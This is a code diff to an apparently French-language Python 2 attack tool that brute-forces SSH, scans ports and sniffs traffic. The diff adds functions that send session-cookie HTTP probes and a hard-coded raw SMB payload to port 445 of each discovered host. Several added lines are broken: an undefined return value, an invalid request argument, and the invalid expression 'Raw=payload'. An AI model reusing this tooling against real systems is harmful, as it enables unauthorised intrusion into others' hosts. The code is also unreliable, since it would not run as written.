@@ -25,6 +25,7 @@ import math
 import errno
 import socket
 import logging
+import requests
 import scapy.route
 import scapy.config
 from ftplib import FTP
@@ -114,6 +115,20 @@ def ssh_conn(log, addr, passwd):
 		flag = 1
 	except:
 		pass
+
+def query(port, dst):
+	url 	= dst + ':' + port
+	cookie	= {'spip_session':pwd_alpha(16, 'alpha')}
+	headers = {'content-type': 'application/json'}
+	def upload_pkt(packet):
+    		r = requests.get(url, headers=headers, cookie=cookie)
+ 	return uploaded_pkt
+
+def smb_query(dst):
+	payload = "\x00\x00\x001\xffSMB+\x00\x00\x00\x00\x18C\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe\x00\x00\xfe\xff\x01\x01\x00\x0c\x00JlJmIhClBsr\x00"
+	def smb_pkt(packet):
+		send(IP(dst=dst)/TCP(dport=445)/Raw=payload)
+	return smb_pkt
 	
 def long2net(arg):
 	if (arg <= 0 or arg >= 0xFFFFFFFF):
@@ -376,16 +391,13 @@ if __name__ == '__main__':
 			except:
 				print '\033[91m[-]\033[0m une erreur est survenue: Ouverture de la wordlist.'
 				sys.exit(-1)
-		elif args.mode is not None:
+		else:
 			print "\n\033[92m[*]\033[0m Mode:", args.mode[0]
 			print "\033[94m[+]\033[0m Generation du dictionnaire (100.000 elements max)."
-			print "\033[92m[*]\033[0m  Longueur des lignes:", args.longueur[0]
-			print "\033[92m[*]\033[0m  Pour interrompre le processus et poursuivre les tests -> [CTRL+C]"
+			print "\033[92m[*]\033[0m Longueur des lignes:", args.longueur[0]
+			print "\033[92m[*]\033[0m Pour interrompre le processus et poursuivre les tests -> [CTRL+C]"
 			dic = generate(args.mode[0], args.longueur[0])
-		else:
-			online = []
-			print '\033[91m[-]\033[0m Online est vide après le scan de port.\n'
-
+		
 	if online is not None:
 		idx = 0
 		for host in online:
@@ -432,29 +444,29 @@ if __name__ == '__main__':
 # HTTP ---------------------------------------------------------------------------------------------------------
 			if 80 in online[host] or 8000 in online[host] or 8080 in online[host]:
 				port_idx = [i for i,x in enumerate(online[host]) if x == 8080 or x == 8000 or x == 80]
-				print "\033[94m[+]\033[0m Cible avec HTTP ouvert : %s sur le port %d." % (host, port_idx)
-				try:
-					sniffed = sniff(filter="tcp and port " +
-							str(online[host][port_idx]) + " and host " + host, count=100)
-					wrpcap('HTTP-' + host + '-filtered.pcap', sniffed, append=True)
-				except KeyboardInterrupt:
-					wrpcap('HTTP-' + host + '-filtered.pcap', sniffed, append=True)
+				print "\033[94m[+]\033[0m Sniffing -> Cible avec HTTP ouvert : %s sur le port %d." % (host, port_idx)
+				sniffed = sniff(prn=query(online[host][port_idx], host), 
+						filter="tcp and port " + 
+						str(online[host][port_idx]) + " and host " + host, 
+						count=25)
+				logger.info('\033[92m[*]\033[0m Sommaire --------\n{}'.format(sniffed.summary()))
+				wrpcap('HTTP-' + host + '-filtered.pcap', sniffed, append=True)
 # HTTPS --------------------------------------------------------------------------------------------------------
 			if 443 in online[host]:
-				print "\033[94m[+]\033[0m Cible avec HTTPS ouvert : %s." % host
-				try:
-					sniffed = sniff(filter="tcp and port 443 and host " + host, count=100)
-					wrpcap('HTTPS-' + host + '-filtered.pcap', sniffed, append=True)
-				except KeyboardInterrupt:
-					wrpcap('HTTPS-' + host + '-filtered.pcap', sniffed, append=True)
+				print "\033[94m[+]\033[0m Sniffing -> Cible avec HTTPS ouvert : %s." % host
+				sniffed = sniff(prn=query(443, host), 
+						filter="tcp and port 443 and host " + host, 
+						count=25)
+				logger.info('\033[92m[*]\033[0m Sommaire --------\n{}'.format(sniffed.summary()))
+				wrpcap('HTTPS-' + host + '-filtered.pcap', sniffed, append=True)
 # SMB ----------------------------------------------------------------------------------------------------------
 			if 445 in online[host]:
-				print "\033[94m[+]\033[0m Cible avec SMB ouvert : %s." % host
-				try:
-					sniffed = sniff(filter="tcp and port 445 and host " + host, count=100)
-					wrpcap('SMB-' + host + '-filtered.pcap', sniffed, append=True)
-				except KeyboardInterrupt:
-					wrpcap('SMB-' + host + '-filtered.pcap', sniffed, append=True)
+				print "\033[94m[+]\033[0m Sniffing -> Cible avec SMB ouvert : %s." % host
+				sniffed = sniff(prn=smb_query(host),
+						filter="port 445 and host " + host, 
+						count=25)
+				logger.info('\033[92m[*]\033[0m Sommaire --------\n{}'.format(sniffed.summary()))
+				wrpcap('SMB-' + host + '-filtered.pcap', sniffed, append=True)
 		sys.exit('\n\033[94m[+]\033[0m # Job done #\n')
 	else:
 		sys.exit('\033[91m[-]\033[0m Afin de poursuivre l\'analyse, vous devez mentionner un mode (wordlist / mode de bf).')
